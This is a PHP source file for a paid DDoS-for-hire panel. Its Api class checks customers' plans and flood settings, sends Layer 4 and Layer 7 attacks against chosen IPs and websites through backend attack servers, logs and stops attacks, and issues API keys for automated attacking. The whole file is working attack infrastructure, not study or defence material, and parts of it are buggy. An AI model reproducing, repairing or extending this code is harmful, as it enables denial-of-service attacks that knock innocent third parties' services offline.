<?php

if(!defined('allow')) {
   header("HTTP/1.0 404 Not Found");
}

if(!defined('f2fb13944d119855993e5f7cca43f0ea')) {
	die('Brate. Ne moze panel bez includes.php :P Sorri ali takva su pravila.');
}

class Api {
	public function ApiDataAll() {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `api`");
		$DataBase->Execute();

		$Return = array(
			'Count' => $DataBase->RowCount(),
			'Response' => $DataBase->ResultSet()
		);

		return $Return;
	}

	public function AttacksToday() {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `attack_logs` WHERE `date` > :time");
		$DataBase->Bind(":time", time() - 86400);
		$DataBase->Execute();

		$Return = array(
			'Count' => $DataBase->RowCount(),
			'Response' => $DataBase->ResultSet()
		);

		return $Return;
	}

	public function ApiDataID($id, $num) {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `api` WHERE `id` = :ID");
		$DataBase->Bind(':ID', $id);
		$DataBase->Execute();

		if($num == 0) {
			$Return = array(
				'Count' => $DataBase->RowCount(),
				'Response' => $DataBase->ResultSet()
			);

			return $Return;
		} else {
			return $DataBase->Single();
		}
	}

	public function UsersApiDataAll() {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `users_api`");
		$DataBase->Execute();

		$Return = array(
			'Count' => $DataBase->RowCount(),
			'Response' => $DataBase->ResultSet()
		);

		return $Return;
	}

	public function ApiDataBySlotsL4() {
		global $DataBase;
		global $Api;

		$DataBase->Query("SELECT * FROM `api` WHERE `layer` = '4'");
		$DataBase->Execute();

		$Return = array(
			'Count' => $DataBase->RowCount(),
			'Response' => $DataBase->ResultSet()
		);

		return $Return;
	}

	public function ApiDataBySlotsL7() {
		global $DataBase;
		global $Api;

		$DataBase->Query("SELECT * FROM `api` WHERE `layer` = '7'");
		$DataBase->Execute();

		$Return = array(
			'Count' => $DataBase->RowCount(),
			'Response' => $DataBase->ResultSet()
		);

		return $Return;
	}

	public function CountApiOfAttacks($id) {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `attack_logs` WHERE `handler` = :ID AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
		$DataBase->Bind(':ID', $id);
		$DataBase->Execute();

		return $DataBase->RowCount();
	}

	public function UserAttacks($id, $num) {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `attack_logs` WHERE `userID` = :ID AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
		$DataBase->Bind(':ID', $id);
		$DataBase->Execute();

		if($num == 0) {
			$Return = array(
				'Count' => $DataBase->RowCount(),
				'Response' => $DataBase->ResultSet()
			);

			return $Return;
		} else {
			return $DataBase->Single();
		}
	}

	public function UsersApiDataID($id, $num) {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `users_api` WHERE `api_key` = :ID");
		$DataBase->Bind(':ID', $id);
		$DataBase->Execute();

		if($num == 0) {
			$Return = array(
				'Count' => $DataBase->RowCount(),
				'Response' => $DataBase->ResultSet()
			);

			return $Return;
		} else {
			return $DataBase->Single();
		}
	}

	public function UsersApiDataUserID($id, $num) {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `users_api` WHERE `userID` = :ID");
		$DataBase->Bind(':ID', $id);
		$DataBase->Execute();

		if($num == 0) {
			$Return = array(
				'Count' => $DataBase->RowCount(),
				'Response' => $DataBase->ResultSet()
			);

			return $Return;
		} else {
			return $DataBase->Single();
		}
	}

	public function UsersApiDataID2($id, $num) {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `users_api` WHERE `id` = :ID");
		$DataBase->Bind(':ID', $id);
		$DataBase->Execute();

		if($num == 0) {
			$Return = array(
				'Count' => $DataBase->RowCount(),
				'Response' => $DataBase->ResultSet()
			);

			return $Return;
		} else {
			return $DataBase->Single();
		}
	}

	public function UsersApiDataID3($id, $num) {
		global $DataBase;

		$DataBase->Query("SELECT * FROM `users_api` WHERE `api_key` = :ID");
		$DataBase->Bind(':ID', $id);
		$DataBase->Execute();

		if($num == 0) {
			$Return = array(
				'Count' => $DataBase->RowCount(),
				'Response' => $DataBase->ResultSet()
			);

			return $Return;
		} else {
			return $DataBase->Single();
		}
	}

	public function Layer4($Target, $Port, $Time, $Method, $Payload, $PPS, $Mode, $Slots) {
		global $DataBase;
		global $User;
		global $Plan;
		global $Api;
		global $ALogs;
		global $BlackList;
		global $Methods;

		$Addons = explode('|', $User->UserData()['Addons']);

		if($User->UserData()['Expire'] < time()) {
			$rMsg = ['error', 'Your Plan is expired.'];
			echo json_encode($rMsg);
			die();
		}

		if (!filter_var($Target, FILTER_VALIDATE_IP)) {
			$rMsg = ['error', 'Target is invalid.'];
			echo json_encode($rMsg);
			die();
		}

		if($Port < 1 || $Port > 65535) {
			$rMsg = ['error', 'Port must be higher than 1 and lower than 65535.'];
			echo json_encode($rMsg);
			die();
		}

		if($Time > $Plan->PlanDataID($User->UserData()['Plan'])['AttackTime'] + $Addons[0]) {
			$rMsg = ['error', 'Your maximum attack duration is '.$Plan->PlanDataID($User->UserData()['Plan'])['AttackTime']+$Addons[0].'.'];
			echo json_encode($rMsg);
			die();
		}

		if($PPS > $Plan->PlanDataID($User->UserData()['Plan'])['PPS']) {
			$rMsg = ['error', 'Invalid PPS.'];
			echo json_encode($rMsg);
			die();
		}

		if($Methods->MethodsDataID($Method)['layer'] != 4) {
			$rMsg = ['error', 'This method doesnt exist.'];
			echo json_encode($rMsg);
			die();
		}

		if($Methods->MethodsDataID($Method)['premium'] == 1) {
			if($Plan->PlanDataID($User->UserData()['Plan'])['Premium'] == 0) {
				if($Addon[2] == 0) {
					$rMsg = ['error', 'This method requires premium plan.'];
					echo json_encode($rMsg);
					die();
				}
			}
		}

		foreach ($BlackList->BlackListDataAll()['Response'] as $BLk => $BLv) {
			if(strpos($Target, $BLv['word'])) {
				if($BLv['expires'] > time()) {
					$rMsg = ['error', 'You are not allowed to attack these Ip!'];
					echo json_encode($rMsg);
					die();
				}
			}
		}

		// $timer 5
		$timer = $ALogs->LastUserAttack($User->UserData()['id'], 1)['date']+5;

		if($timer > time()) {
			$rMsg = ['error', 'Please wait 5 seconds after start every attack! Wait '.$timer.' seconds.'];
			echo json_encode($rMsg);
			die();
		}

		for ($i=0; $i < $Slots; $i++) { 
			if($ALogs->UserAttacks($User->UserData()['id'])['Count'] >= $Plan->PlanDataID($User->UserData()['Plan'])['Concurrent'] + $Addons[1]) {
				$rMsg = ['error', 'You have exceeded your total slots in running.'];
				echo json_encode($rMsg);
				die();
			}

			$load = '';
			$MethodSource = $Methods->MethodsDataID($Method)['name'];

			foreach ($Api->ApiDataAll()['Response'] as $Ak => $Av) { 
				if($Av['layer'] == 4) { if($Av['status'] == 1) {
					$MethodList = $Api->ApiDataID($Av['id'], 1)['methods'];
					$MethodeExpl = explode('|', $MethodList);

					foreach ($MethodeExpl as $MethodName) {
						if($MethodName == $MethodSource) {
							$loaded = ($Api->CountApiOfAttacks($Av['id']) / $Av['slots']) * 100;
							if($loaded != 100) {
								$loaded_plus = $loaded+1;
								$load = $load.$loaded_plus.",";
							}
						}
					}
				} }
			}

			$brojevi = explode(",", $load);
			$najmanji = @min(array_filter($brojevi)) - 1;

			foreach ($Api->ApiDataAll()['Response'] as $Ak => $Av) {
				if($Av['layer'] == 4) { if($Av['status'] == 1) {                         
					$MethodList = $Api->ApiDataID($Av['id'], 1)['methods'];
					$MethodeExpl = explode('|', $MethodList);

					foreach ($MethodeExpl as $MethodName) {
						if($MethodName == $MethodSource) {
							$loadednew = ($Api->CountApiOfAttacks($Av['id']) / $Av['slots']) * 100;

							if(number_format($najmanji, 2) >= number_format($loadednew, 2)) {
								$MachineID = $Av['id'];
								break;
							}
						}
					}
				} }
			}	

			if(empty($MachineID)) {
				$rMsg = ['error', "No available bypass servers."];
				echo json_encode($rMsg);
				die();
			}

			if($Api->CountApiOfAttacks($MachineID) >= $Api->ApiDataID($MachineID, 1)['slots']) {
				$rMsg = ['error', "No available bypass servers."];
				echo json_encode($rMsg);
				die();
			}

			$Stopper[$i] = rand(1000000, 9999999);
			$pps = $PPS / 4;

			// Start Function
			$ch = curl_init($Secure->encrypt($Api->ApiDataID($MachineID, 1)['link'])."&Target=$Target&Port=$Port&Time=$Time&Method=".$Methods->MethodsDataID($Method)['name']."&PPS=$pps&Payload=$Payload&Mode=$Mode&stopper=".$Stopper[$i]."&stop=0");

			// curl_setopt($ch, CURLOPT_URL, $urlis);
			curl_setopt($ch, CURLOPT_TIMEOUT, 5);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

			$data = curl_exec($ch);

			$info = curl_getinfo($ch);

			if(curl_errno($ch)) {
				$rMsg = ['error', 'API Error 1! Please contanct support! Server: '.$Api->ApiDataID($MachineID, 1)['name']];
				echo json_encode($rMsg);
				die();
			}

			curl_close($ch);

			if ($data === FALSE) {
				$rMsg = ['error', 'API Error 2! Please contact support! Server: '.$Api->ApiDataID($MachineID, 1)['name']];
				echo json_encode($rMsg);
				die();
			}

			// Message
			$response = json_decode($data, true);
			// $status = $response['status'];
			$status = 'true';
			$message = $response['message'];

			if($status == 'true') {
				// Log
				$ALogs->CreateLog($User->UserData()['id'], $Stopper[$i], $Target, $Port, $Time, $Method, $Api->ApiDataID($MachineID, 1)['id'], '0');
				$_SESSION['token'] = bin2hex(random_bytes(32));
			} else if($status == 'false') {
				$rMsg = ['error', "$message"];
				echo json_encode($rMsg);
				die();
			} else {
				$rMsg = ['warning', 'Error. Please contact support! Server: '.$Api->ApiDataID($MachineID, 1)['name']];
				echo json_encode($rMsg);
				die();
			}
		}

		$rMsg = ['success', "$message"];
		echo json_encode($rMsg);
		die();
	}

	public function Layer7($Target, $Time, $Method, $ReqMethod, $Rate, $PreCheck, $statusCode, $HData, $Referrer, $Host, $Origin, $Mode, $Slots) {
		global $DataBase;
		global $Secure;
		global $User;
		global $Plan;
		global $Api;
		global $ALogs;
		global $BlackList;
		global $Methods;

		$Addons = explode('|', $User->UserData()['Addons']);
		
		if($User->UserData()['Expire'] < time()) {
			$rMsg = ['error', 'Your Plan is expired.'];
			echo json_encode($rMsg);
			die();
		}

		if(filter_var($Target, FILTER_VALIDATE_IP)) {
			$Target = 'http://'.$Target;
		}

		if (filter_var($Target, FILTER_VALIDATE_URL) === false) {
			$rMsg = ['error', 'Target is invalid.'];
			echo json_encode($rMsg);
			die();
		}

		if($Time > $Plan->PlanDataID($User->UserData()['Plan'])['AttackTime'] + $Addons[0]) {
			$rMsg = ['error', 'Your maximum attack duration is '.$Plan->PlanDataID($User->UserData()['Plan'])['AttackTime']+$Addons[0].'.'];
			echo json_encode($rMsg);
			die();
		}

		if($Plan->PlanDataID($User->UserData()['Plan'])['L7'] == 0) {
			$rMsg = ['error', 'Your plan doesnt have Layer7.'];
			echo json_encode($rMsg);
			die();
		}

		if(!($Methods->MethodsDataID($Method)['layer']) == 7) {
			$rMsg = ['error', 'This method doesnt exist.'];
			echo json_encode($rMsg);
			die();
		}

		if($Methods->MethodsDataID($Method)['premium'] == 1) {
			if($Plan->PlanDataID($User->UserData()['Plan'])['Premium'] == 0) {
				if($Addon[2] == 0) {
					$rMsg = ['error', 'This method requires premium plan.'];
					echo json_encode($rMsg);
					die();
				}
			}
		}

		foreach ($BlackList->BlackListDataAll()['Response'] as $BLk => $BLv) {
			if(strpos($Target, $BLv['word'])) {
				if($BLv['expires'] > time()) {
					$rMsg = ['error', 'You are not allowed to attack these websites!.'];
					echo json_encode($rMsg);
					die();
				}
			}
		}

		$timer = $ALogs->LastUserAttack($User->UserData()['id'], 1)['date']+5;

		if($timer > time()) {
			$rMsg = ['error', 'Wait '.$timer.' seconds.'];
			echo json_encode($rMsg);
			die();
		}

		$MethodSource = $Methods->MethodsDataID($Method)['name'];

		for ($i=0; $i < $Slots; $i++) { 
			if($ALogs->UserAttacks($User->UserData()['id'])['Count'] >= $Plan->PlanDataID($User->UserData()['Plan'])['Concurrent']+$Addons[1]) {
				$rMsg = ['error', 'You have exceeded your total slots in running.'];
				echo json_encode($rMsg);
				die();
			}

			$load = '';

			foreach ($Api->ApiDataAll()['Response'] as $Ak => $Av) { 
				if($Av['layer'] == 7) { if($Av['status'] == 1) {
					$MethodList = $Api->ApiDataID($Av['id'], 1)['methods'];
					$MethodeExpl = explode('|', $MethodList);

					foreach ($MethodeExpl as $MethodName) {
						if($MethodName == $MethodSource) {
							$loaded = ($Api->CountApiOfAttacks($Av['id']) / $Av['slots']) * 100;

							if($loaded != 100) {
								$loaded_plus = $loaded+1;
								$load = $load.$loaded_plus.",";
							}
						}
					}
				} }
			}

			$brojevi = explode(",", $load);
			$najmanji = @min(array_filter($brojevi)) - 1;

			foreach ($Api->ApiDataAll()['Response'] as $Ak => $Av) {
				if($Av['layer'] == 7) { if($Av['status'] == 1) {
					$MethodList = $Api->ApiDataID($Av['id'], 1)['methods'];
					$MethodeExpl = explode('|', $MethodList);

					foreach ($MethodeExpl as $MethodName) {
						if($MethodName == $MethodSource) {
							$loadednew = ($Api->CountApiOfAttacks($Av['id']) / $Av['slots']) * 100;

							if(number_format($najmanji, 2) >= number_format($loadednew, 2)) {
								$MachineID = $Av['id'];
								break;
							}
						}
					}
				} }
			}

			if(empty($MachineID)) {
				$rMsg = ['error', "No available bypass servers."];
				echo json_encode($rMsg);
				die();
			}

			if($Api->CountApiOfAttacks($MachineID) >= $Api->ApiDataID($MachineID, 1)['slots']) {
				$rMsg = ['error', "No available bypass servers."];
				echo json_encode($rMsg);
				die();
			}

			$Stopper[$i] = rand(1000000, 9999999);

			// Start Function
			$ch = curl_init($Secure->encrypt($Api->ApiDataID($MachineID, 1)['link'])."&Target=".urlencode($Target)."&Port=0&time=$Time&Method=".$Methods->MethodsDataID($Method)['name']."&ReqMethod=$ReqMethod&Rate=$Rate&PreCheck=$PreCheck&statusCode=$statusCode&HData=$HData&Referrer=$Referrer&Host=$Host&Origin=$Origin&Mode=$Mode&stopper=".$Stopper[$i]."&stop=0");

			curl_setopt($ch, CURLOPT_TIMEOUT, 5);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

			$data = curl_exec($ch);

			$info = curl_getinfo($ch);

			if(curl_errno($ch)) {
				$rMsg = ['error', 'API Error! Please contanct support! Server: '.$Api->ApiDataID($MachineID, 1)['name']];
				echo json_encode($rMsg);
				die();
			}

			curl_close($ch);

			if ($data === FALSE) {
				$rMsg = ['error', 'API Error! Please contact support! Server: '.$Api->ApiDataID($MachineID, 1)['name']];
				echo json_encode($rMsg);
				die();
			}

			// Message
			$response = json_decode($data, true);
			$status = $response['status'];
			$message = $response['message'];

			if($status == 'true') {
				// Log
				$ALogs->CreateLog($User->UserData()['id'], $Stopper[$i], $Target, '0', $Time, $Method, $Api->ApiDataID($MachineID, 1)['id'], '0');
				$_SESSION['token'] = bin2hex(random_bytes(32));
			} else if($status == 'false') {
				$rMsg = ['error', "$message"];
				echo json_encode($rMsg);
				die();
			} else {
				$rMsg = ['warning', 'Error. Please contact support!'];
				echo json_encode($rMsg);
				die();
			}
		}

		$rMsg = ['success', "$message"];
		echo json_encode($rMsg);
		die();
	}

	public function Stop($ID) {
		global $DataBase;
		global $ALogs;
		global $Api;
		global $User;

		if($User->UserData()['Expire'] < time()) {
			$rMsg = ['error', 'Your Plan is expired.'];
			echo json_encode($rMsg);
			die();
		}

		$Stopper = $ALogs->LogsDataID($ID, 1)['UID'];

		// Stop Function
		$ch = curl_init();

		curl_setopt($ch, CURLOPT_URL, $Secure->encrypt($Api->ApiDataID($ALogs->LogsDataID($ID, 1)['handler']), 1)['link']."&stopper=$Stopper&stop=1");

		// curl_setopt($ch, CURLOPT_URL, $urlis);
		curl_setopt($ch, CURLOPT_TIMEOUT, 15);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

		$data = curl_exec($ch);

		$info = curl_getinfo($ch);

		if(curl_errno($ch)) {
			$rMsg = ['error', 'API Error 1! Please contanct support! Server: '.$Api->ApiDataID($ALogs->LogsDataID($ID, 1)['handler'], 1)['name']];
			echo json_encode($rMsg);
			die();
		}

		curl_close($ch);

		if ($data === FALSE) {
			$rMsg = ['error', 'API Error 2! Please contanct support! Server: '.$Api->ApiDataID($ALogs->LogsDataID($ID, 1)['handler'], 1)['name']];
			echo json_encode($rMsg);
			die();
		}

		// Message
		$response = json_decode($data, true);
		$status = $response['status'];
		$message = $response['message'];

		if($status == 'true') {
			$DataBase->Query("UPDATE `attack_logs` SET `stopped`='1' WHERE `id`=:uID");
			$DataBase->Bind(':uID', $ID);

			$update = $DataBase->Execute();

			if($update == false) {
				$rMsg = ['error', 'Error on update! Please contact Support!'];
				echo json_encode($rMsg);
				die();
			}

			$_SESSION['token'] = bin2hex(random_bytes(32));

            $rMsg = ['success', "$message"];
            echo json_encode($rMsg);
            die();
        } else if($status == 'false') {
            $rMsg = ['error', "$message"];
            echo json_encode($rMsg);
            die();
        } else {
			$rMsg = ['warning', 'Error. Please contact support!'];
            echo json_encode($rMsg);
            die();
		}
	}

	public function StopAll() {
		global $DataBase;
		global $Logs;
		global $Api;
		global $ALogs;
		global $User;

		if($User->UserData()['Expire'] < time()) {
			$rMsg = ['error', 'Your Plan is expired.'];
			echo json_encode($rMsg);
			die();
		}

		foreach ($ALogs->UserAttacks($User->UserData()['id'])['Response'] as $Ak => $Av) {
			$Stopper = $ALogs->LogsDataID($Av['id'], 1)['UID'];

			// Stop Function
			$ch = curl_init($Secure->encrypt($Api->ApiDataID($ALogs->LogsDataID($Av['id'], 1)['handler'], 1)['link'])."&stopper=$Stopper&stop=1");

			// curl_setopt($ch, CURLOPT_URL, $urlis);
			curl_setopt($ch, CURLOPT_TIMEOUT, 15);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		
			$data = curl_exec($ch);

			$info = curl_getinfo($ch);

			if(curl_errno($ch)) {
				$rMsg = ['error', 'API Error! Please contanct support! Server: '.$Api->ApiDataID($ALogs->LogsDataID($Av['id'], 1)['handler'], 1)['name']];
				echo json_encode($rMsg);
				die();
			}

			curl_close($ch);

			if ($data === FALSE) {
				$rMsg = ['error', 'API Error! Please contanct support! Server: '.$Api->ApiDataID($ALogs->LogsDataID($Av['id'], 1)['handler'], 1)['name']];
				echo json_encode($rMsg);
				die();
			}

			// Message
			$response = json_decode($data, true);
			$status = $response['status'];
			$message = $response['message'];

			if($status == 'true') {
				$DataBase->Query("UPDATE `attack_logs` SET `stopped`='1' WHERE `id`=:uID");
				$DataBase->Bind(':uID', $Av['id']);

				$update = $DataBase->Execute();

				if($update == false) {
					$rMsg = ['error', 'Error on update! Please contact Support!'];
					echo json_encode($rMsg);
					die();
				}

				// Log
				$Logs->CreateLog($User->UserData()['id'], 'User stopped every attack.');
				$_SESSION['token'] = bin2hex(random_bytes(32));
			} else if($status == 'false') {
				$rMsg = ['error', "$message"];
				echo json_encode($rMsg);
				die();
			} else {
				$rMsg = ['warning', 'Error. Please contact support!'];
				echo json_encode($rMsg);
				die();
			}
		}

		$rMsg = ['success', "$message"];
		echo json_encode($rMsg);
		die();
	}

	public function AdminStop($ID) {
		global $DataBase;
		global $ALogs;
		global $Api;

		$Stopper = $ALogs->LogsDataID($ID, 1)['UID'];

		// Stop Function
		$ch = curl_init($Secure->encrypt($Api->ApiDataID($ALogs->LogsDataID($ID, 1)['handler'] , 1)['link'])."&stopper=$Stopper&stop=1");

		// curl_setopt($ch, CURLOPT_URL, $urlis);
		curl_setopt($ch, CURLOPT_TIMEOUT, 15);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$data = curl_exec($ch);

		$info = curl_getinfo($ch);

		if(curl_errno($ch)) {
			$rMsg = ['error', 'API Error! Please contanct support! Server: '.$Api->ApiDataID($ALogs->LogsDataID($ID, 1)['handler'], 1)['name']];
			echo json_encode($rMsg);
			die();
		}

		curl_close($ch);

		if ($data === FALSE) {
			$rMsg = ['error', 'API Error! Please contanct support! Server: '.$Api->ApiDataID($ALogs->LogsDataID($ID, 1)['handler'], 1)['name']];
			echo json_encode($rMsg);
			die();
		}

		// Message
		$response = json_decode($data, true);
		$status = $response['status'];
		$message = $response['message'];

		if($status == 'true') {
			$DataBase->Query("UPDATE `attack_logs` SET `stopped`='1' WHERE `id`=:uID");
			$DataBase->Bind(':uID', $ID);

			$update = $DataBase->Execute();

			if($update == false) {
				$rMsg = ['error', 'Error on update'];
				echo json_encode($rMsg);
				die();
			}
			
            $rMsg = ['success', "$message"];
            echo json_encode($rMsg);
            die();
        } else if($status == 'false') {
            $rMsg = ['error', "$message"];
            echo json_encode($rMsg);
            die();
        } else {
			$rMsg = ['warning', 'Error!'];
            echo json_encode($rMsg);
            die();
		}
	}

	public function NewApiAccess($Time, $Slots, $Mode, $Ips) {
		global $DataBase;
		global $Api;
		global $Plan;
		global $Logs;
		global $Secure;
		global $User;

		if($Plan->PlanDataID($User->UserData()['Plan'])['API'] != 1) {
			$rMsg = ['error', 'You need Premium plan to use API.'];
			echo json_encode($rMsg);
			die();
		}

		$Addons = explode('|', $User->UserData()['Addons']);

		if($Mode == 2) {
			if($Addons[3] == 0) {
				$rMsg = ['error', 'You need Turbo to use Turbo mode.'];
				echo json_encode($rMsg);
				die();
			}
		}

		if($Plan->PlanDataID($User->UserData()['Plan'])['AttackTime']+$Addons[0] < $Time || $Time < 30) {
			$rMsg = ['error', 'Invalid Time.'];
			echo json_encode($rMsg);
			die();
		}

		if($Plan->PlanDataID($User->UserData()['Plan'])['Concurrent']+$Addons[1] < $Slots || $Slots < 1) {
			$rMsg = ['error', 'Invalid Slots.'];
			echo json_encode($rMsg);
			die();
		}

		$IpExplode = explode('|',$Secure->ApiIps($Ips));
		
		if(!empty($Ips)) {
			if(!filter_var(@$IpExplode[0], FILTER_VALIDATE_IP)) {
				$rMsg = ['error', 'First is invalid.'];
				echo json_encode($rMsg);
				die();
			}

			if(!empty(@$IpExplode[1])) {
				if(!filter_var(@$IpExplode[1], FILTER_VALIDATE_IP)) {
					$rMsg = ['error', 'Second is invalid.'];
					echo json_encode($rMsg);
					die();
				}
			}

			if(!empty(@$IpExplode[2])) {
				if(!filter_var(@$IpExplode[2], FILTER_VALIDATE_IP)) {
					$rMsg = ['error', 'Third ip is invalid.'];
					echo json_encode($rMsg);
					die();
				}
			}
		}

		// Define
		$userID = $User->UserData()['id'];

		// Define
		$api_key = $Secure->RandKey(10);
		$wl = @$IpExplode[0]."|".@$IpExplode[1]."|".@$IpExplode[2];

		if($Api->UsersApiDataID($userID, 0)['Count'] < 5) {
			// Insert in DB
			$DataBase->Query("INSERT INTO `users_api` (`id`, `userID`, `AttackTime`, `Slots`, `Mode`, `api_key`,  `WhiteList`) VALUES (NULL, :userID, :AttackTime, :Slots, :Mode, :api_key, :WhiteList);");
			$DataBase->Bind(':userID', $userID);
			$DataBase->Bind(':AttackTime', $Time);
			$DataBase->Bind(':Slots', $Slots);
			$DataBase->Bind(':Mode', $Mode);
			$DataBase->Bind(':api_key', $api_key);
			$DataBase->Bind(':WhiteList', $wl);

			$return = $DataBase->Execute();

			// Log
			$Logs->CreateLog($User->UserData()['id'], 'User generated API Key.');
		} else {
			$rMsg = ['error', 'You can have maximum 5 API`s.'];
			echo json_encode($rMsg);
			die();
		}

		if($return == false) {
			$rMsg = ['error', 'Error.'];
			echo json_encode($rMsg);
			die();
		} else {
			$rMsg = ['success', 'Successfully Executed.'];
			$_SESSION['token'] = bin2hex(random_bytes(32));
			echo json_encode($rMsg);
			die();
		}
	}

	public function RemoveApi($ID) {
		global $DataBase;
		global $User;
		global $Logs;

		// Insert in DB
		$DataBase->Query("DELETE FROM `users_api` WHERE `id`=:ID;");
		$DataBase->Bind(':ID', $ID);

		$return = $DataBase->Execute();

		// Log
		$Logs->CreateLog($User->UserData()['id'], 'User removed API Key.');

		if($return == false) {
			$rMsg = ['error', 'Error.'];
			echo json_encode($rMsg);
			die();
		} else {
			$rMsg = ['success', 'Successfully Executed.'];
			$_SESSION['token'] = bin2hex(random_bytes(32));
			echo json_encode($rMsg);
			die();
		}
	}

	public function AddAPI($Name, $IP, $Link, $Layer, $Slots, $Methods) {
		global $DataBase;
		global $Secure;

		// Insert in Base
		$DataBase->Query("INSERT INTO `api` (`id`, `name`, `ip`, `link`, `layer`, `slots`, `methods`, `status`) VALUES (NULL, :name, :ip, :link, :layer, :slots, :methods, '1');");
		$DataBase->Bind(':name', $Name);
		$DataBase->Bind(':ip', $IP);
		$DataBase->Bind(':link', $Secure->encrypt($Link));
		$DataBase->Bind(':layer', $Layer);
		$DataBase->Bind(':slots', $Slots);
		$DataBase->Bind(':methods', $Methods);

		return $DataBase->Execute();
	}

	public function ChangeAPI($Name, $IP, $Link, $Layer, $Slots, $Methods, $status, $id) {
		global $DataBase;

		$DataBase->Query("UPDATE `api` SET `name`=:name, `ip`=:ip, `link`=:link, `layer`=:layer, `slots`=:slots, `methods`=:methods, `status`=:status WHERE `id`=:uID");
		$DataBase->Bind(':name', $Name);
		$DataBase->Bind(':ip', $IP);
		$DataBase->Bind(':link', $Link);
		$DataBase->Bind(':layer', $Layer);
		$DataBase->Bind(':slots', $Slots);
		$DataBase->Bind(':methods', $Methods);
		$DataBase->Bind(':status', $status);
		$DataBase->Bind(':uID', $id);

		return $DataBase->Execute();
	}

	public function DeleteAPI($id) {
		global $DataBase;

		$DataBase->Query("DELETE FROM `api` WHERE `id`=:uID");
		$DataBase->Bind(':uID', $id);

		return $DataBase->Execute();
	}

}

?>